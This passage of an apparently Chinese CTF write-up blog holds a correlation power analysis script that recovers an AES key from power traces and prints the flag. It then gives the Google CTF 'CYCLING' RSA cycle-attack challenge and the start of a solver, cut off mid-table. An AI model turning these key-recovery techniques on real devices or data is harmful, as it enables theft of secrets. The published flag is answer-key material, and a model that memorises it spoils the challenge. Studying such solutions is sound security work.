<span class="number">0</span>xad, <span class="number">0</span>xd<span class="number">4</span>, <span class="number">0</span>xa<span class="number">2</span>, <span class="number">0</span>xaf, <span class="number">0</span>x<span class="number">9</span>c, <span class="number">0</span>xa<span class="number">4</span>, <span class="number">0</span>x<span class="number">72</span>, <span class="number">0</span>xc<span class="number">0</span>,</span><br><span class="line">    <span class="attribute">0xb7</span>, <span class="number">0</span>xfd, <span class="number">0</span>x<span class="number">93</span>, <span class="number">0</span>x<span class="number">26</span>, <span class="number">0</span>x<span class="number">36</span>, <span class="number">0</span>x<span class="number">3</span>f, <span class="number">0</span>xf<span class="number">7</span>, <span class="number">0</span>xcc, <span class="number">0</span>x<span class="number">34</span>, <span class="number">0</span>xa<span class="number">5</span>, <span class="number">0</span>xe<span class="number">5</span>, <span class="number">0</span>xf<span class="number">1</span>, <span class="number">0</span>x<span class="number">71</span>, <span class="number">0</span>xd<span class="number">8</span>, <span class="number">0</span>x<span class="number">31</span>, <span class="number">0</span>x<span class="number">15</span>,</span><br><span class="line">    <span class="attribute">0x04</span>, <span class="number">0</span>xc<span class="number">7</span>, <span class="number">0</span>x<span class="number">23</span>, <span class="number">0</span>xc<span class="number">3</span>, <span class="number">0</span>x<span class="number">18</span>, <span class="number">0</span>x<span class="number">96</span>, <span class="number">0</span>x<span class="number">05</span>, <span class="number">0</span>x<span class="number">9</span>a, <span class="number">0</span>x<span class="number">07</span>, <span class="number">0</span>x<span class="number">12</span>, <span class="number">0</span>x<span class="number">80</span>, <span class="number">0</span>xe<span class="number">2</span>, <span class="number">0</span>xeb, <span class="number">0</span>x<span class="number">27</span>, <span class="number">0</span>xb<span class="number">2</span>, <span class="number">0</span>x<span class="number">75</span>,</span><br><span class="line">    <span class="attribute">0x09</span>, <span class="number">0</span>x<span class="number">83</span>, <span class="number">0</span>x<span class="number">2</span>c, <span class="number">0</span>x<span class="number">1</span>a, <span class="number">0</span>x<span class="number">1</span>b, <span class="number">0</span>x<span class="number">6</span>e, <span class="number">0</span>x<span class="number">5</span>a, <span class="number">0</span>xa<span class="number">0</span>, <span class="number">0</span>x<span class="number">52</span>, <span class="number">0</span>x<span class="number">3</span>b, <span class="number">0</span>xd<span class="number">6</span>, <span class="number">0</span>xb<span class="number">3</span>, <span class="number">0</span>x<span class="number">29</span>, <span class="number">0</span>xe<span class="number">3</span>, <span class="number">0</span>x<span class="number">2</span>f, <span class="number">0</span>x<span class="number">84</span>,</span><br><span class="line">    <span class="attribute">0x53</span>, <span class="number">0</span>xd<span class="number">1</span>, <span class="number">0</span>x<span class="number">00</span>, <span class="number">0</span>xed, <span class="number">0</span>x<span class="number">20</span>, <span class="number">0</span>xfc, <span class="number">0</span>xb<span class="number">1</span>, <span class="number">0</span>x<span class="number">5</span>b, <span class="number">0</span>x<span class="number">6</span>a, <span class="number">0</span>xcb, <span class="number">0</span>xbe, <span class="number">0</span>x<span class="number">39</span>, <span class="number">0</span>x<span class="number">4</span>a, <span class="number">0</span>x<span class="number">4</span>c, <span class="number">0</span>x<span class="number">58</span>, <span class="number">0</span>xcf,</span><br><span class="line">    <span class="attribute">0xd0</span>, <span class="number">0</span>xef, <span class="number">0</span>xaa, <span class="number">0</span>xfb, <span class="number">0</span>x<span class="number">43</span>, <span class="number">0</span>x<span class="number">4</span>d, <span class="number">0</span>x<span class="number">33</span>, <span class="number">0</span>x<span class="number">85</span>, <span class="number">0</span>x<span class="number">45</span>, <span class="number">0</span>xf<span class="number">9</span>, <span class="number">0</span>x<span class="number">02</span>, <span class="number">0</span>x<span class="number">7</span>f, <span class="number">0</span>x<span class="number">50</span>, <span class="number">0</span>x<span class="number">3</span>c, <span class="number">0</span>x<span class="number">9</span>f, <span class="number">0</span>xa<span class="number">8</span>,</span><br><span class="line">    <span class="attribute">0x51</span>, <span class="number">0</span>xa<span class="number">3</span>, <span class="number">0</span>x<span class="number">40</span>, <span class="number">0</span>x<span class="number">8</span>f, <span class="number">0</span>x<span class="number">92</span>, <span class="number">0</span>x<span class="number">9</span>d, <span class="number">0</span>x<span class="number">38</span>, <span class="number">0</span>xf<span class="number">5</span>, <span class="number">0</span>xbc, <span class="number">0</span>xb<span class="number">6</span>, <span class="number">0</span>xda, <span class="number">0</span>x<span class="number">21</span>, <span class="number">0</span>x<span class="number">10</span>, <span class="number">0</span>xff, <span class="number">0</span>xf<span class="number">3</span>, <span class="number">0</span>xd<span class="number">2</span>,</span><br><span class="line">    <span class="attribute">0xcd</span>, <span class="number">0</span>x<span class="number">0</span>c, <span class="number">0</span>x<span class="number">13</span>, <span class="number">0</span>xec, <span class="number">0</span>x<span class="number">5</span>f, <span class="number">0</span>x<span class="number">97</span>, <span class="number">0</span>x<span class="number">44</span>, <span class="number">0</span>x<span class="number">17</span>, <span class="number">0</span>xc<span class="number">4</span>, <span class="number">0</span>xa<span class="number">7</span>, <span class="number">0</span>x<span class="number">7</span>e, <span class="number">0</span>x<span class="number">3</span>d, <span class="number">0</span>x<span class="number">64</span>, <span class="number">0</span>x<span class="number">5</span>d, <span class="number">0</span>x<span class="number">19</span>, <span class="number">0</span>x<span class="number">73</span>,</span><br><span class="line">    <span class="attribute">0x60</span>, <span class="number">0</span>x<span class="number">81</span>, <span class="number">0</span>x<span class="number">4</span>f, <span class="number">0</span>xdc, <span class="number">0</span>x<span class="number">22</span>, <span class="number">0</span>x<span class="number">2</span>a, <span class="number">0</span>x<span class="number">90</span>, <span class="number">0</span>x<span class="number">88</span>, <span class="number">0</span>x<span class="number">46</span>, <span class="number">0</span>xee, <span class="number">0</span>xb<span class="number">8</span>, <span class="number">0</span>x<span class="number">14</span>, <span class="number">0</span>xde, <span class="number">0</span>x<span class="number">5</span>e, <span class="number">0</span>x<span class="number">0</span>b, <span class="number">0</span>xdb,</span><br><span class="line">    <span class="attribute">0xe0</span>, <span class="number">0</span>x<span class="number">32</span>, <span class="number">0</span>x<span class="number">3</span>a, <span class="number">0</span>x<span class="number">0</span>a, <span class="number">0</span>x<span class="number">49</span>, <span class="number">0</span>x<span class="number">06</span>, <span class="number">0</span>x<span class="number">24</span>, <span class="number">0</span>x<span class="number">5</span>c, <span class="number">0</span>xc<span class="number">2</span>, <span class="number">0</span>xd<span class="number">3</span>, <span class="number">0</span>xac, <span class="number">0</span>x<span class="number">62</span>, <span class="number">0</span>x<span class="number">91</span>, <span class="number">0</span>x<span class="number">95</span>, <span class="number">0</span>xe<span class="number">4</span>, <span class="number">0</span>x<span class="number">79</span>,</span><br><span class="line">    <span class="attribute">0xe7</span>, <span class="number">0</span>xc<span class="number">8</span>, <span class="number">0</span>x<span class="number">37</span>, <span class="number">0</span>x<span class="number">6</span>d, <span class="number">0</span>x<span class="number">8</span>d, <span class="number">0</span>xd<span class="number">5</span>, <span class="number">0</span>x<span class="number">4</span>e, <span class="number">0</span>xa<span class="number">9</span>, <span class="number">0</span>x<span class="number">6</span>c, <span class="number">0</span>x<span class="number">56</span>, <span class="number">0</span>xf<span class="number">4</span>, <span class="number">0</span>xea, <span class="number">0</span>x<span class="number">65</span>, <span class="number">0</span>x<span class="number">7</span>a, <span class="number">0</span>xae, <span class="number">0</span>x<span class="number">08</span>,</span><br><span class="line">    <span class="attribute">0xba</span>, <span class="number">0</span>x<span class="number">78</span>, <span class="number">0</span>x<span class="number">25</span>, <span class="number">0</span>x<span class="number">2</span>e, <span class="number">0</span>x<span class="number">1</span>c, <span class="number">0</span>xa<span class="number">6</span>, <span class="number">0</span>xb<span class="number">4</span>, <span class="number">0</span>xc<span class="number">6</span>, <span class="number">0</span>xe<span class="number">8</span>, <span class="number">0</span>xdd, <span class="number">0</span>x<span class="number">74</span>, <span class="number">0</span>x<span class="number">1</span>f, <span class="number">0</span>x<span class="number">4</span>b, <span class="number">0</span>xbd, <span class="number">0</span>x<span class="number">8</span>b, <span class="number">0</span>x<span class="number">8</span>a,</span><br><span class="line">    <span class="attribute">0x70</span>, <span class="number">0</span>x<span class="number">3</span>e, <span class="number">0</span>xb<span class="number">5</span>, <span class="number">0</span>x<span class="number">66</span>, <span class="number">0</span>x<span class="number">48</span>, <span class="number">0</span>x<span class="number">03</span>, <span class="number">0</span>xf<span class="number">6</span>, <span class="number">0</span>x<span class="number">0</span>e, <span class="number">0</span>x<span class="number">61</span>, <span class="number">0</span>x<span class="number">35</span>, <span class="number">0</span>x<span class="number">57</span>, <span class="number">0</span>xb<span class="number">9</span>, <span class="number">0</span>x<span class="number">86</span>, <span class="number">0</span>xc<span class="number">1</span>, <span class="number">0</span>x<span class="number">1</span>d, <span class="number">0</span>x<span class="number">9</span>e,</span><br><span class="line">    <span class="attribute">0xe1</span>, <span class="number">0</span>xf<span class="number">8</span>, <span class="number">0</span>x<span class="number">98</span>, <span class="number">0</span>x<span class="number">11</span>, <span class="number">0</span>x<span class="number">69</span>, <span class="number">0</span>xd<span class="number">9</span>, <span class="number">0</span>x<span class="number">8</span>e, <span class="number">0</span>x<span class="number">94</span>, <span class="number">0</span>x<span class="number">9</span>b, <span class="number">0</span>x<span class="number">1</span>e, <span class="number">0</span>x<span class="number">87</span>, <span class="number">0</span>xe<span class="number">9</span>, <span class="number">0</span>xce, <span class="number">0</span>x<span class="number">55</span>, <span class="number">0</span>x<span class="number">28</span>, <span class="number">0</span>xdf,</span><br><span class="line">    <span class="attribute">0x8c</span>, <span class="number">0</span>xa<span class="number">1</span>, <span class="number">0</span>x<span class="number">89</span>, <span class="number">0</span>x<span class="number">0</span>d, <span class="number">0</span>xbf, <span class="number">0</span>xe<span class="number">6</span>, <span class="number">0</span>x<span class="number">42</span>, <span class="number">0</span>x<span class="number">68</span>, <span class="number">0</span>x<span class="number">41</span>, <span class="number">0</span>x<span class="number">99</span>, <span class="number">0</span>x<span class="number">2</span>d, <span class="number">0</span>x<span class="number">0</span>f, <span class="number">0</span>xb<span class="number">0</span>, <span class="number">0</span>x<span class="number">54</span>, <span class="number">0</span>xbb, <span class="number">0</span>x<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> addkey_subbytes(pt, guesskey):</span><br><span class="line">    <span class="attribute">return</span> sbox[pt ^ guesskey]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">N</span> = len(json_load)</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(N)</span><br><span class="line"><span class="comment"># print(json_load[0][&#x27;pt&#x27;])</span></span><br><span class="line"><span class="comment"># print(json_load[0][&#x27;ct&#x27;])</span></span><br><span class="line"><span class="comment"># print(json_load[0][&#x27;pm&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">bestguess</span> =<span class="meta"> [0] * 16</span></span><br><span class="line"><span class="meta">data_start = 7</span></span><br><span class="line"><span class="meta">data_end = 200</span></span><br><span class="line"><span class="meta">NUM_POINTS = data_end - data_start</span></span><br><span class="line"><span class="meta">NUM_TRACES = len(json_load)</span></span><br><span class="line"><span class="meta">traces = []</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> pt_ct_pm in json_load:</span><br><span class="line">    <span class="attribute">traces</span>.append(pt_ct_pm[&#x27;pm&#x27;][data_start:data_end])</span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> k_idx in range(<span class="number">16</span>):  # determine key index</span><br><span class="line">    <span class="attribute">cpaoutput</span> =<span class="meta"> [0] * 256</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    # follow valiables may not be need</span></span><br><span class="line"><span class="meta">    maxcpa = [0] * 256</span></span><br><span class="line"><span class="meta">    bestcor = 0</span></span><br><span class="line"><span class="meta">    bestkey = 0</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    for kguess in range(256):  # determine word key candidate</span></span><br><span class="line"><span class="meta">        sumnum = np.zeros(NUM_POINTS)</span></span><br><span class="line"><span class="meta">        sumden1 = np.zeros(NUM_POINTS)</span></span><br><span class="line"><span class="meta">        sumden2 = np.zeros(NUM_POINTS)</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">        hyp = np.zeros(NUM_TRACES)</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">        for t_idx in range(NUM_TRACES):  # hypothesis hamming weight</span></span><br><span class="line"><span class="meta">            hyp[t_idx] = humming[addkey_subbytes(json_load[t_idx][&#x27;pt&#x27;][k_idx], kguess)]</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">h_mean</span> = np.mean(hyp, dtype=np.float<span class="number">64</span>)</span><br><span class="line">        <span class="attribute">t_mean</span> = np.mean(traces, axis=<span class="number">0</span>, dtype=np.float<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">        <span class="attribute">assert</span> <span class="number">0</span> &lt; h_mean and h_mean &lt; <span class="number">8</span>, <span class="string">&quot;meanh is not between 0 and 8&quot;</span></span><br><span class="line">        <span class="attribute">assert</span> len(t_mean) == NUM_POINTS, <span class="string">&quot;meant is less than trace points&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">cors</span> =<span class="meta"> []</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">for</span> t_idx in range(NUM_TRACES):</span><br><span class="line">            <span class="attribute">hdiff</span> = (hyp[t_idx] - h_mean)</span><br><span class="line">            <span class="attribute">tdiff</span> = traces[t_idx] - t_mean</span><br><span class="line"></span><br><span class="line">            <span class="attribute">sumnum</span> = sumnum + (hdiff * tdiff)</span><br><span class="line">            <span class="attribute">sumden1</span> = sumden<span class="number">1</span> + hdiff * hdiff</span><br><span class="line">            <span class="attribute">sumden2</span> = sumden<span class="number">2</span> + tdiff * tdiff</span><br><span class="line"></span><br><span class="line">        <span class="attribute">cpaoutput</span>[kguess] = sumnum / np.sqrt(sumden<span class="number">1</span> * sumden<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="attribute">maxcpa</span>[kguess] = max(abs(cpaoutput[kguess]))</span><br><span class="line"></span><br><span class="line">    <span class="attribute">bestguess</span>[k_idx] = np.argmax(maxcpa)</span><br><span class="line">    <span class="attribute">print</span>(<span class="string">&quot;[+] best guess key [&#123;0&#125;] is &#123;1:02x&#125; (score: &#123;2&#125;)&quot;</span>.format(k_idx, bestguess[k_idx], maxcpa[bestguess[k_idx]]))</span><br><span class="line"></span><br><span class="line"><span class="attribute">strkey</span> = &#x27;&#x27;.join(map(chr, bestguess))</span><br><span class="line"><span class="attribute">print</span>(strkey)</span><br><span class="line"><span class="comment"># W0ckAwocKaWoCka1</span></span><br><span class="line"><span class="comment"># CTF&#123;W0ckAwocKaWoCka1&#125;</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>不足</strong></p><ul><li>搜索能力弱了，接受新鲜事物的能力也差</li></ul><p><strong>收获</strong></p><ul><li><p>可以关注关注日韩CTF圈子</p><p>不少密码难题的wp都是日韩出的，值得重视</p></li></ul><h2 id="CYCLING"><a href="#CYCLING" class="headerlink" title="CYCLING"></a>CYCLING</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><blockquote><p>It is well known that any RSA encryption can be undone by just encrypting the ciphertext over and over again. If the RSA modulus has been chosen badly then the number of encryptions necessary to undo an encryption is small. However, if the modulus is well chosen then a cycle attack can take much longer. This property can be used for a timed release of a message. We have confirmed that it takes a whopping 2^1025-3 encryptions to decrypt the flag. Pack out your quantum computer and perform 2^1025-3 encryptions to solve this challenge. Good luck doing this in 48h.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2022 Google LLC</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment"># you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"># You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"># See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"># limitations under the License.</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">It is well known that any RSA encryption can be undone by just encrypting the</span></span><br><span class="line"><span class="string">ciphertext over and over again. If the RSA modulus has been chosen badly then</span></span><br><span class="line"><span class="string">the number of encryptions necessary to undo an encryption is small.</span></span><br><span class="line"><span class="string">If n = 0x112b00148621 then only 209 encryptions are necessary as the following</span></span><br><span class="line"><span class="string">example demonstrates:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>e = 65537</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>n = 0x112b00148621</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>pt = 0xdeadbeef</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span># Encryption</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>ct = pow(pt, e, n)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span># Decryption via cycling:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>pt = ct</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>for _ in range(209):</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>  pt = pow(pt, e, n)</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span># Assert decryption worked:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>assert ct == pow(pt, e, n)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">However, if the modulus is well chosen then a cycle attack can take much longer.</span></span><br><span class="line"><span class="string">This property can be used for a timed release of a message. We have confirmed</span></span><br><span class="line"><span class="string">that it takes a whopping 2^1025-3 encryptions to decrypt the flag. Pack out</span></span><br><span class="line"><span class="string">your quantum computer and perform 2^1025-3 encryptions to solve this</span></span><br><span class="line"><span class="string">challenge. Good luck doing this in 48h.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line"><span class="comment"># Decryption via cycling:</span></span><br><span class="line">pt = ct</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">1025</span> - <span class="number">3</span>):</span><br><span class="line">  <span class="built_in">print</span>(_)</span><br><span class="line">  pt = <span class="built_in">pow</span>(pt, e, n)</span><br><span class="line">  <span class="built_in">print</span>(pt)</span><br><span class="line">  <span class="keyword">if</span> ct == <span class="built_in">pow</span>(pt, e, n):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Assert decryption worked:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Print flag:</span></span><br><span class="line"><span class="built_in">print</span>(pt.to_bytes((pt.bit_length() + <span class="number">7</span>)//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>只有代码，没有解释原理的wp，看了半小时，看不懂😵‍💫</p><p>先放着吧（中文注释是我尝试理解所翻译的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy, libnum</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用字段大小的2**i-1的素因子表。这是必要的，因为该文件中的因式分解仅使用试用除法。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2^(L)-1就是二进制下L个1</span></span><br><span class="line"><span class="comment"># 以下数据来自: factor(2^(L)-1). 可用factor网页而不是sage</span></span><br><span class="line">MERSENNE_PRIME_FACTORS = &#123;</span><br><span class="line">    <span class="number">64</span>: [<span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">65537</span>, <span class="number">6700417</span>],</span><br><span class="line">    <span class="number">96</span>: [<span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">193</span>, <span class="number">241</span>, <span class="number">257</span>, <span class="number">673</span>, <span class="number">65537</span>, <span class="number">22253377</span>],</span><br><span class="line">    <span class="number">128</span>: [<span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">65537</span>, <span class="number">274177</span>, <span class="number">6700417</span>, <span class="number">67280421310721</span>],</span><br><span class="line">    <span class="number">160</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">257</span>, <span class="number">61681</span>, <span class="number">65537</span>, <span class="number">414721</span>, <span class="number">4278255361</span>,</span><br><span class="line">        <span class="number">44479210368001</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">192</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">193</span>, <span class="number">241</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">673</span>, <span class="number">65537</span>, <span class="number">6700417</span>,</span><br><span class="line">        <span class="number">22253377</span>, <span class="number">18446744069414584321</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">224</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">29</span>, <span class="number">43</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">257</span>, <span class="number">449</span>, <span class="number">2689</span>, <span class="number">5153</span>, <span class="number">65537</span>, <span class="number">15790321</span>,</span><br><span class="line">        <span class="number">183076097</span>, <span class="number">54410972897</span>, <span class="number">358429848460993</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">255</span>: [</span><br><span class="line">        <span class="number">7</span>, <span class="number">31</span>, <span class="number">103</span>, <span class="number">151</span>, <span class="number">2143</span>, <span class="number">11119</span>, <span class="number">106591</span>, <span class="number">131071</span>, <span class="number">949111</span>,</span><br><span class="line">        <span class="number">9520972806333758431</span>, <span class="number">5702451577639775545838643151</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">256</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">257</span>, <span class="number">641</span>, <span class="number">65537</span>, <span class="number">274177</span>, <span class="number">6700417</span>, <span class="number">67280421310721</span>,</span><br><span class="line">        <span class="number">59649589127497217</span>, <span class="number">5704689200685129054721</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">384</span>: [</span><br><span class="line">        <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">97</span>, <span 